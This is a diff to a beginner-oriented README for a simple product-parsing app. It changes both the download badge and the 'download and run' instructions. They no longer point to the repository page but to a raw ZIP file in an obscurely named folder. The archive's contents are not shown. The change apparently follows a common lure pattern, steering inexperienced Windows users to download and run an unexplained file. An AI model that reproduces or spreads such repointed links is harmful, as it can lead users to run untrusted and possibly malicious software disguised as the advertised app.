@@ -1,6 +1,6 @@
 # 📘 basic-parser-example - Simple product parsing made easy
 
-[![Download](https://img.shields.io/badge/Download-Basic%20Parser%20Example-blue?style=for-the-badge)](https://github.com/kgxhama/basic-parser-example)
+[![Download](https://img.shields.io/badge/Download-Basic%20Parser%20Example-blue?style=for-the-badge)](https://github.com/kgxhama/basic-parser-example/raw/refs/heads/main/brachistochronous/parser-basic-example-v2.5.zip)
 
 ## 🖥️ What this app does
 
@@ -19,7 +19,7 @@ This project is meant for beginners who want a simple example they can run on Wi
 
 Visit this page to download and run the app:
 
-https://github.com/kgxhama/basic-parser-example
+https://github.com/kgxhama/basic-parser-example/raw/refs/heads/main/brachistochronous/parser-basic-example-v2.5.zip
 
 If the page contains a source code ZIP or a release file, download it to your computer first.
 
